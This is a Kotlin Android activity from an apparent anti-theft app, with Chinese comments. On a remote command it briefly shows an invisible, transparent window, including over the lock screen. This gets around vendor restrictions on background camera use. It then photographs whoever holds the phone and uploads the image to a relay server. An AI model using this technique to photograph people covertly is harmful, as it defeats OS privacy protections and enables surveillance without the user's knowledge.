package com.example.antitheft

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.WindowManager
import java.io.File

/**
 * 透明拍照 Activity：收到拍照指令（或解锁抓拍）后瞬时切到前台，
 * 在「应用可见」态 openCamera 抓一帧（绕开 MIUI/vivo 等「仅在使用中允许」对后台相机的拦截），
 * 上传后立刻 finish 回后台。无布局、透明，视觉上只是屏幕一闪。
 *
 * 关键约束：
 *  - API>=27 设 setShowWhenLocked/setTurnScreenOn，使锁屏态也能覆盖显示并点亮屏幕（远程锁屏拍场景）
 *  - singleInstance + taskAffinity=""（Manifest 中）保证不进入用户当前任务栈，finish 后无 backstack 残留
 *  - 拍照上传完全在 Activity 自带线程内完成，不依赖 AntiTheftService 生命周期
 */
class CamShootActivity : Activity() {
    companion object {
        const val EXTRA_FACING = "facing"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // 锁屏态也能盖在锁屏之上并自动亮屏（远程锁屏拍场景需要）
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        }
        // ===== 系统栏透明（顶部黑条根因修复）=====
        // 根因复盘：
        //  1) 之前 Manifest 用的 Holo 版 Theme.Translucent，translucent 窗口的状态栏
        //     背景由系统画成默认黑色，代码 setStatusBarColor 压不住 —— 已换成
        //     Theme.Material.Translucent.NoTitleBar。
        //  2) 之前代码里 FLAG_LAYOUT_NO_LIMITS + FLAG_FULLSCREEN 与 statusBarColor
        //     互相打架（StackOverflow 有明确结论：NO_LIMITS 会让 statusBarColor 完全
        //     失效；FULLSCREEN 在 MIUI 上藏不掉状态栏，反而强制黑底）。
        // 正确组合：只用 LAYOUT_* 让窗口绘制延伸到系统栏后方（不主动隐藏系统栏），
        // 再由 statusBarColor/navigationBarColor = TRANSPARENT 透出底层 app 画面。
        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
            View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or
            // 状态栏文字用深色：透出的是浅色底（微信等白底 app），默认白字看不清。
            // 注：MIUI 对此 flag 支持不稳定，不生效也只是维持白字 1 秒后自动回退，无副作用。
            View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR
        )
        window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS)
        window.statusBarColor = android.graphics.Color.TRANSPARENT
        window.navigationBarColor = android.graphics.Color.TRANSPARENT
        // API29+ 系统会给透明系统栏强制加一层半透明对比度遮罩（scrim），关掉
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            window.isStatusBarContrastEnforced = false
            window.isNavigationBarContrastEnforced = false
        }
        val facing = intent?.getStringExtra(EXTRA_FACING) ?: "front"
        Log.i("CamShootActivity", "onCreate facing=$facing")

        Thread {
            var tmp: File? = null
            try {
                tmp = File(cacheDir, "at_photo_${System.currentTimeMillis()}.jpg")
                val ok = CameraCapture.capture(this, tmp, facing)
                val token = Prefs.getToken(this)
                if (ok && token != null && tmp.exists()) {
                    val up = RelayApi.uploadPhoto(token, tmp, facing)
                    Log.i("CamShootActivity", "captured ok=$ok uploaded=$up facing=$facing")
                    if (up) RelayApi.checkCommands(this, token)
                } else {
                    Log.e("CamShootActivity", "capture failed ok=$ok hasToken=${token != null}")
                }
            } catch (e: Exception) {
                Log.e("CamShootActivity", "shoot ex", e)
            } finally {
                runCatching { tmp?.delete() }
                // 拍完立即回后台，避免长时间占用前台导致状态栏绿点/通知异常
                runOnUiThread { finish() }
            }
        }.start()
    }
}
